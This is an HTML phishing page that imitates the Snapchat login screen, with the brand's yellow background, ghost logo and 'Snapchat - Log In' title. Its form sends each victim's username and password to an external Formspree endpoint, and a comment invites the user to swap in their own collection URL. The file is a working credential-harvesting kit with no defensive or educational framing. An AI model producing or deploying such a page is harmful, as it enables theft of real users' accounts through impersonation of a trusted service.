<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snapchat - Log In</title>
<style>
body {
background-color: #fff900; /* Snapchat Yellow! */
font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}
.login-container {
background-color: white;
padding: 20px;
border-radius: 10px;
box-shadow: 0 4px 8px rgba(0,0,0,0.1);
width: 300px;
text-align: center;
}
h2 {
color: black;
margin-bottom: 20px;
}
input[type="text"], input[type="password"] {
width: 100%;
padding: 10px;
margin: 10px 0;
border: 1px solid #ccc;
border-radius: 5px;
box-sizing: border-box;
}
button {
background-color: #000;
color: white;
padding: 10px 20px;
border: none;
border-radius: 5px;
cursor: pointer;
width: 100%;
font-weight: bold;
}
button:hover {
background-color: #333;
}
.logo {
font-size: 40px;
margin-bottom: 10px;
}
</style>
</head>
<body>

<div class="login-container">
<div class="logo">👻</div>
<h2>Snapchat</h2>

<!-- Replace the URL below with your Formspree or other endpoint URL -->
<form action="https://formspree.io/f/mrpglagg" method="POST">
<input type="text" name="username" placeholder="Phone, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>

<p style="font-size: 12px; color: gray; margin-top: 15px;">
<a href="#" style="color: gray;">Forgot password?</a>
</p>
</div>

</body>
</html>
